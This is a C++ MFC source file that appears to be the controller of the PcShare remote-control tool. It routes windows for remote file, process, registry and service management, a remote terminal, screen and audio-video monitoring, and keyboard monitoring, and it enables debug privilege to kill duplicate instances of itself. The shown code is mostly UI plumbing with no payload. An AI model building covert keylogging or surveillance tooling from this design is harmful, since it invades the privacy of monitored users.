// PcShare.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "PcShare.h"

#include "MainFrm.h"
#include "MyFramWnd.h"
#include "MyFileWnd.h"
#include "MyProcWnd.h"
#include "MyServWnd.h"
#include "MyTlntWnd.h"
#include "MyMultWnd.h"
#include "MyRegtWnd.h"
#include "MyCwndWnd.h"
#include "MyKeyMWnd.h"
#include "MyFileDownWnd.h"
#include "MyMainShowWnd.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/*
作者的QQ是4564405，网名无可非议，转载或者修改版本请打上作者的标记，也是对辛勤劳动的尊重；
*/

using namespace Gdiplus;

/////////////////////////////////////////////////////////////////////////////
// CPcShareApp

BEGIN_MESSAGE_MAP(CPcShareApp, CWinApp)
	//{{AFX_MSG_MAP(CPcShareApp)
	ON_COMMAND(ID_APP_ABOUT, OnAppAbout)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
	// Standard file based document commands
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPcShareApp construction



CPcShareApp::CPcShareApp()
{
	
}

CPcShareApp::~CPcShareApp()
{
	
}
/////////////////////////////////////////////////////////////////////////////
// The one and only CPcShareApp object

CPcShareApp theApp;

CWnd* StartMoudle(LPCTSTR m_lpCmdLine)
{
	CWnd* pWnd = NULL;

	//功能插件
	TCHAR m_Title[1024] = {0};// char to TCHAR [9/15/2007 zhaiyinwei]
	GetStrValue(m_lpCmdLine, _T("title"), m_Title);
	if(StrStr(m_Title, _T("文件管理")) != NULL)
	{
		CMyFileWnd* pFrame = new CMyFileWnd();
		pFrame->m_IsFindFile = FALSE;
		pFrame->Create(NULL, m_Title);
		pFrame->ShowWindow(SW_NORMAL);
		pFrame->UpdateWindow();
		pFrame->BringWindowToTop();
		pFrame->StartWork(m_lpCmdLine);
		pWnd = pFrame;
	}
	else if(StrStr(m_Title, _T("文件搜索")) != NULL)
	{
		CMyFileWnd* pFrame = new CMyFileWnd();
		pFrame->m_IsFindFile = TRUE;
		pFrame->Create(NULL, m_Title);
		pFrame->ShowWindow(SW_NORMAL);
		pFrame->UpdateWindow();
		pFrame->BringWindowToTop();
		pFrame->StartWork(m_lpCmdLine);
		pWnd = pFrame;
	}
	else if(StrStr(m_Title, _T("屏幕监控")) != NULL)
	{
		CMyFramWnd* pFrame = new CMyFramWnd;
		pFrame->Create(NULL, m_Title);
		pFrame->ShowWindow(SW_NORMAL);
		pFrame->UpdateWindow();
		pFrame->BringWindowToTop();
		pFrame->StartWork(m_lpCmdLine);
		pWnd = pFrame;
	}
	else if(StrStr(m_Title, _T("音视频监控")) != NULL)
	{
		CMyMultWnd* pFrame = new CMyMultWnd;
		pFrame->Create(NULL, m_Title);
		pFrame->ShowWindow(SW_NORMAL);
		pFrame->UpdateWindow();
		pFrame->BringWindowToTop();
		pFrame->StartWork(m_lpCmdLine);
		pWnd = pFrame;
	}
	else if(StrStr(m_Title, _T("超级终端")) != NULL)
	{
		CMyTlntWnd* pFrame = new CMyTlntWnd;
		pFrame->Create(NULL, m_Title);
		pFrame->ShowWindow(SW_NORMAL);
		pFrame->UpdateWindow();
		pFrame->BringWindowToTop();
		pFrame->StartWork(m_lpCmdLine);
		pWnd = pFrame;
	}
	else if(StrStr(m_Title, _T("键盘监控")) != NULL)
	{
		CMyKeyMWnd* pFrame = new CMyKeyMWnd;
		pFrame->Create(NULL, m_Title);
		pFrame->ShowWindow(SW_NORMAL);
		pFrame->UpdateWindow();
		pFrame->BringWindowToTop();
		pFrame->StartWork(m_lpCmdLine);
		pWnd = pFrame;
	}
	else if(StrStr(m_Title, _T("进程管理")) != NULL)
	{
		CMyProcWnd* pFrame = new CMyProcWnd;
		pFrame->LoadFrame(IDR_MENU_MANA);
		pFrame->SetWindowText(m_Title);
		pFrame->ShowWindow(SW_NORMAL);
		pFrame->UpdateWindow();
		pFrame->BringWindowToTop();
		pFrame->StartWork(m_lpCmdLine);
		pWnd = pFrame;
	}
	else if(StrStr(m_Title, _T("窗口管理")) != NULL)
	{
		CMyCwndWnd* pFrame = new CMyCwndWnd;
		pFrame->LoadFrame(IDR_MENU_MANA);
		pFrame->SetWindowText(m_Title);
		pFrame->ShowWindow(SW_NORMAL);
		pFrame->UpdateWindow();
		pFrame->BringWindowToTop();
		pFrame->StartWork(m_lpCmdLine);
		pWnd = pFrame;
	}
	else if(StrStr(m_Title, _T("服务管理")) != NULL)
	{
		CMyServWnd* pFrame = new CMyServWnd;
		pFrame->LoadFrame(IDR_MENU_MANA);
		pFrame->SetWindowText(m_Title);
		pFrame->ShowWindow(SW_NORMAL);
		pFrame->UpdateWindow();
		pFrame->BringWindowToTop();
		pFrame->StartWork(m_lpCmdLine);
		pWnd = pFrame;
	}
	else if(StrStr(m_Title, _T("注册表管理")) != NULL)
	{
		CMyRegtWnd* pFrame = new CMyRegtWnd;
		pFrame->LoadFrame(IDR_MENU_MANA);
		pFrame->SetWindowText(m_Title);
		pFrame->ShowWindow(SW_NORMAL);
		pFrame->UpdateWindow();
		pFrame->BringWindowToTop();
		pFrame->StartWork(m_lpCmdLine);
		pWnd = pFrame;
	}
	else if(StrStr(m_Title, _T("下载管理")) != NULL)
	{
		CMyFileDownWnd* pFrame = new CMyFileDownWnd;
		pFrame->Create(NULL, m_Title);
		pFrame->ShowWindow(SW_HIDE);
		pFrame->UpdateWindow();
		pFrame->BringWindowToTop();
		pFrame->StartWork(m_lpCmdLine);
		pWnd = pFrame;
	}
	else if(StrStr(m_Title, _T("主控制台")) != NULL)
	{
		CMyMainShowWnd* pFrame = new CMyMainShowWnd;
		pFrame->LoadFrame(IDR_MAINFRAME);
		pFrame->SetWindowText(m_Title);
		pFrame->ShowWindow(SW_SHOWMAXIMIZED);
		pFrame->ResizeWnd();
		pFrame->UpdateWindow();
		pFrame->StartWork();
		pWnd = pFrame;
	}
	return pWnd;
}

void CPcShareApp::GetMoudleMame(DWORD pId, TCHAR* pExeName)
{
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pId);
    if(NULL == hProcess) 
	{
		return;
	}
	TCHAR m_ExeName[MAX_PATH] = {0};
	if(GetModuleFileNameEx(hProcess, NULL, m_ExeName, 1024) > 0)
	{
		lstrcpy(pExeName, m_ExeName);
	}
    CloseHandle(hProcess);
}

void CPcShareApp::KillOneProcess(DWORD nProcessId)
{
	HANDLE m_Kill = OpenProcess(PROCESS_TERMINATE, FALSE, nProcessId);
	if(m_Kill == NULL)
	{
		//终止进程失败
		return;
	}

	if(!TerminateProcess(m_Kill,0))
	{
		//终止进程失败
		CloseHandle(m_Kill);
		return;
	}

	CloseHandle(m_Kill);
}

void CPcShareApp::KillSameProcess()
{
	// 给枚举的进程增加SE_DEBUG_NAME权限即可：
	HANDLE hToken;              // handle to process token 
	TOKEN_PRIVILEGES tkp;       // pointer to token structure 
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken); 
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, 
	&tkp.Privileges[0].Luid); 
	tkp.PrivilegeCount = 1;  // one privilege to set    
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES) NULL, 0); 

	DWORD dId[4096] = {0};
	DWORD nSize = 0;
	if(!EnumProcesses(dId, sizeof(DWORD) * 4096, &nSize))
	{
		return;
	}

	TCHAR m_ProcessName[256] = {0};
	GetModuleFileName(NULL, m_ProcessName, 250);
	CharLower(m_ProcessName);

	for(DWORD i = 0; i < nSize / sizeof(DWORD); i++)
	{
		TCHAR m_EnumProcessName[256] = {0};
		GetMoudleMame(dId[i], m_EnumProcessName);
		CharLower(m_EnumProcessName);
		if(StrCmp(m_EnumProcessName, m_ProcessName) == 0 && dId[i] != GetCurrentProcessId())
		{
			KillOneProcess(dId[i]);
			Sleep(200);
		}
	}
}

BOOL CPcShareApp::InitInstance()
{
	//初始化SOCKET环境
	WSADATA	data = {0};
	if(WSAStartup(MAKEWORD(2, 2), &data))
	{
		return FALSE;
	}

	if(LOBYTE(data.wVersion) != 2 || HIBYTE(data.wVersion) != 2)
	{
		WSACleanup();
		return FALSE;
	}

	if(!AfxOleInit())
	{
		return FALSE;
	}

	//初始化控件环境
	AfxEnableControlContainer();
	Enable3dControls();	
	CoInitialize(NULL);

	if(lstrlen(m_lpCmdLine) == 0)
	{
		//终止以前遗漏的进程
		KillSameProcess();

		//主界面
		CMainFrame* pFrame = new CMainFrame;
		m_pMainWnd = pFrame;

		TCHAR nCWndName[256] = {0};
		wsprintf(nCWndName, _T("%s连接管理"), PS_TITLE);
		pFrame->Create(NULL, nCWndName);
		return pFrame->StartWork();
	}
	else
	{
		//操作界面
		m_pMainWnd = StartMoudle(m_lpCmdLine);
		ASSERT(m_pMainWnd);
	}
	return TRUE;
}

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

#include "MyLinkCtrl.h"

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	CMyLinkCtrl	m_Url;
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	
	//{{AFX_MSG(CAboutDlg)
	afx_msg void OnStaticQq();
	virtual BOOL OnInitDialog();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
	
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	DDX_Control(pDX, IDC_STATIC_QQ, m_Url);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
	ON_BN_CLICKED(IDC_STATIC_QQ, OnStaticQq)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

void CAboutDlg::OnStaticQq() 
{
	ShellExecute(NULL, NULL, _T("iexplore.exe"), _T("http://www.pcshares.cn"), NULL, SW_SHOWMAXIMIZED);
}

BOOL CAboutDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	m_Url.SetMyFont(_T("宋体"), 12, 100, TRUE);
	return TRUE; 
}

// App command to run the dialog
void CPcShareApp::OnAppAbout()
{
	CAboutDlg aboutDlg;
	aboutDlg.DoModal();
}

/////////////////////////////////////////////////////////////////////////////
// CPcShareApp message handlers

void CPcShareApp::WinHelp(DWORD dwData, UINT nCmd) 
{

}




